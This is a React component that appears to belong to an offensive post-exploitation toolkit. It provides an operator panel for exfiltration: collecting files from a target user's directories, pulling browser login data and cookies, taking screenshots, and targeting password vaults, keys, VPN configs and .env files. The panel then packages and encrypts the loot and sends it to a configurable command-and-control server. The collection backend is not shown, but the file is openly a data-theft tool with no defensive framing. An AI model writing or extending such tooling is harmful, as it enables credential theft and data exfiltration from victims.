import React, { useState, useCallback, useEffect } from 'react';

interface ExfilJob {
  id: string;
  name: string;
  type: string;
  target: string;
  status: 'pending' | 'running' | 'completed' | 'failed';
  progress: number;
  results: ExfilResult[];
  createdAt: string;
  completedAt: string | null;
  encrypted: boolean;
  destination: 'local' | 'c2';
}

interface ExfilResult {
  path: string;
  size: number;
  type: string;
  hash: string;
  timestamp: string;
  uploaded: boolean;
}

const COLLECTION_PATTERNS = [
  { label: 'Documents', types: '*.doc, *.docx, *.xls, *.xlsx, *.pdf, *.txt' },
  { label: 'Credentials', types: '*.kdbx, *.rdp, *.ovpn, *.pem, *.key' },
  { label: 'Config Files', types: '*.env, *.config, *.json, *.xml, *.ini, *.cfg' },
  { label: 'Databases', types: '*.sql, *.db, *.sqlite, *.mdb' },
  { label: 'Source Code', types: '*.py, *.js, *.ts, *.java, *.php, *.rb, *.go' },
  { label: 'Browser Data', types: 'Login Data, History, Cookies, Bookmarks' },
];

export function ExfilPanel() {
  const [jobs, setJobs] = useState<ExfilJob[]>([]);
  const [selectedType, setSelectedType] = useState('file_collect');
  const [targetDir, setTargetDir] = useState('C:\\Users\\');
  const [jobName, setJobName] = useState('');
  const [c2Url, setC2Url] = useState('http://127.0.0.1:8080');
  const [runningJob, setRunningJob] = useState<string | null>(null);
  const [totalSize, setTotalSize] = useState(0);
  const [encryptionKey, setEncryptionKey] = useState('');

  const loadJobs = useCallback(async () => {
    try {
      const j = await window.api.exfilJobs();
      setJobs(j || []);
      const t = await window.api.exfilTotalSize();
      setTotalSize(t || 0);
    } catch {}
  }, []);

  useEffect(() => { loadJobs(); }, []);

  const handleCollect = useCallback(async () => {
    if (!jobName.trim() || !targetDir.trim()) return;

    try {
      const job = await window.api.exfilCreateJob(jobName.trim(), targetDir.trim());
      if (job) {
        setRunningJob(job.id);
        // Run collection
        const result = await window.api.exfilCollectFiles(job.id);
        setRunningJob(null);
        loadJobs();
      }
    } catch (err: any) {
      alert(`Error: ${err.message}`);
      setRunningJob(null);
    }
  }, [jobName, targetDir]);

  const handleScreenshot = useCallback(async () => {
    try {
      await window.api.exfilScreenshot();
      loadJobs();
    } catch (err: any) {
      alert(`Error: ${err.message}`);
    }
  }, []);

  const handleBrowserData = useCallback(async () => {
    try {
      await window.api.exfilBrowserData();
      loadJobs();
    } catch (err: any) {
      alert(`Error: ${err.message}`);
    }
  }, []);

  const handlePackage = useCallback(async (jobId: string) => {
    try {
      const path = await window.api.exfilPackage(jobId);
      if (path) {
        loadJobs();
        const key = await window.api.exfilKey();
        setEncryptionKey(key);
      }
    } catch (err: any) {
      alert(`Error: ${err.message}`);
    }
  }, []);

  const handleExfiltrate = useCallback(async (jobId: string) => {
    try {
      // Package first
      const packagePath = await window.api.exfilPackage(jobId);
      if (packagePath) {
        await window.api.exfilSendToC2(packagePath, c2Url);
        loadJobs();
      }
    } catch (err: any) {
      alert(`Error: ${err.message}`);
    }
  }, [c2Url]);

  const handleClear = useCallback(async () => {
    await window.api.exfilClear();
    loadJobs();
  }, []);

  const formatSize = (bytes: number): string => {
    if (bytes < 1024) return `${bytes} B`;
    if (bytes < 1048576) return `${(bytes / 1024).toFixed(1)} KB`;
    return `${(bytes / 1048576).toFixed(1)} MB`;
  };

  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="card border-midnight-700/50">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <span className="text-lg">📤</span>
            <h2 className="text-sm font-semibold text-gray-300 uppercase tracking-wider">Exfiltration</h2>
          </div>
          <div className="flex items-center gap-3 text-xs text-gray-500">
            <span>{jobs.length} jobs</span>
            <span>{formatSize(totalSize)} collected</span>
            <button onClick={handleClear} className="btn-ghost text-xs text-redhawk-400">Clear All</button>
          </div>
        </div>
      </div>

      {/* Collection form */}
      <div className="card">
        <div className="card-header">Collect Data</div>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mb-3">
          <div>
            <label className="text-[10px] text-gray-500 block mb-1">Job Name</label>
            <input type="text" value={jobName}
              onChange={(e) => setJobName(e.target.value)}
              className="input-field h-9 text-sm" placeholder="Company Data Grab"
            />
          </div>
          <div className="md:col-span-2">
            <label className="text-[10px] text-gray-500 block mb-1">Target Directory</label>
            <input type="text" value={targetDir}
              onChange={(e) => setTargetDir(e.target.value)}
              className="input-field h-9 text-sm font-mono" placeholder="C:\Users\TargetUser"
            />
          </div>
        </div>

        {/* Quick collect buttons */}
        <div className="flex flex-wrap gap-2 mb-3">
          <button onClick={handleCollect} disabled={!jobName.trim() || runningJob !== null}
            className="btn-primary text-xs">
            {runningJob ? 'Collecting...' : '📁 File Collection'}
          </button>
          <button onClick={handleScreenshot} className="btn-secondary text-xs">📸 Screenshot</button>
          <button onClick={handleBrowserData} className="btn-secondary text-xs">🌐 Browser Data</button>
        </div>

        {/* Collection pattern hints */}
        <div className="flex flex-wrap gap-1.5">
          {COLLECTION_PATTERNS.map((p, i) => (
            <button key={i} onClick={() => setTargetDir(`C:\\Users\\${p.label.toLowerCase()}`)}
              className="text-[10px] px-2 py-1 rounded bg-midnight-800 border border-midnight-700
                         text-gray-500 hover:text-gray-300 transition-all"
              title={p.types}>
              {p.label}
            </button>
          ))}
        </div>
      </div>

      {/* C2 destination */}
      <div className="card">
        <div className="card-header">Exfiltration Target</div>
        <div className="flex gap-2 items-center">
          <input type="text" value={c2Url}
            onChange={(e) => setC2Url(e.target.value)}
            className="input-field h-9 text-xs font-mono flex-1" placeholder="http://your-c2-server:8080"
          />
          <span className="text-[10px] text-gray-600">or save locally</span>
        </div>
      </div>

      {/* Jobs list */}
      <div className="space-y-2">
        <div className="card-header">Collected Data</div>
        {jobs.length === 0 ? (
          <div className="card flex flex-col items-center py-8 text-gray-600">
            <span className="text-3xl mb-2">📦</span>
            <p className="text-sm">No data collected yet</p>
            <p className="text-xs">Run a collection job above</p>
          </div>
        ) : (
          jobs.map((job) => (
            <div key={job.id} className="card border-midnight-700/50">
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-2">
                  <span className="text-sm font-medium text-gray-200">{job.name}</span>
                  <span className={`text-[10px] px-1.5 py-0.5 rounded-full ${
                    job.status === 'completed' ? 'bg-green-900/30 text-green-400 border border-green-700/40' :
                    job.status === 'running' ? 'bg-blue-900/30 text-blue-400 border border-blue-700/40 animate-pulse' :
                    job.status === 'failed' ? 'bg-red-900/30 text-red-400 border border-red-700/40' :
                    'bg-yellow-900/30 text-yellow-400 border border-yellow-700/40'
                  }`}>{job.status}</span>
                </div>
                <div className="flex gap-1">
                  {job.results.length > 0 && (
                    <>
                      <button onClick={() => handlePackage(job.id)} className="btn-ghost text-xs">📦 Package</button>
                      <button onClick={() => handleExfiltrate(job.id)} className="btn-ghost text-xs">📤 Exfil</button>
                    </>
                  )}
                </div>
              </div>

              <div className="grid grid-cols-3 gap-2 text-[10px] text-gray-500 mb-2">
                <span>Type: {job.type}</span>
                <span>Files: {job.results.length}</span>
                <span>Size: {formatSize(job.results.reduce((s, r) => s + r.size, 0))}</span>
              </div>

              {/* File list */}
              {job.results.length > 0 && (
                <div className="max-h-40 overflow-y-auto space-y-1">
                  {job.results.map((r, idx) => (
                    <div key={idx} className="flex items-center gap-2 text-xs p-1.5 rounded bg-midnight-800/30">
                      <span className="text-gray-400 font-mono flex-1 truncate" title={r.path}>
                        {r.path.split('\\').pop() || r.path}
                      </span>
                      <span className="text-gray-600">{formatSize(r.size)}</span>
                      <span className={`text-[10px] ${r.uploaded ? 'text-green-500' : 'text-gray-600'}`}>
                        {r.uploaded ? '✓' : '○'}
                      </span>
                    </div>
                  ))}
                </div>
              )}

              {job.completedAt && (
                <p className="text-[10px] text-gray-600 mt-2">
                  Completed: {new Date(job.completedAt).toLocaleString()}
                </p>
              )}
            </div>
          ))
        )}
      </div>

      {/* Encryption key display */}
      {encryptionKey && (
        <div className="card bg-yellow-900/10 border-yellow-700/30">
          <p className="text-[10px] text-yellow-400 font-medium mb-1">🔑 Encryption Key — Save this to decrypt exfiltrated data</p>
          <pre className="terminal text-[10px] select-all">{encryptionKey}</pre>
          <button onClick={() => navigator.clipboard.writeText(encryptionKey)}
            className="btn-ghost text-xs mt-1">📋 Copy Key</button>
        </div>
      )}
    </div>
  );
}
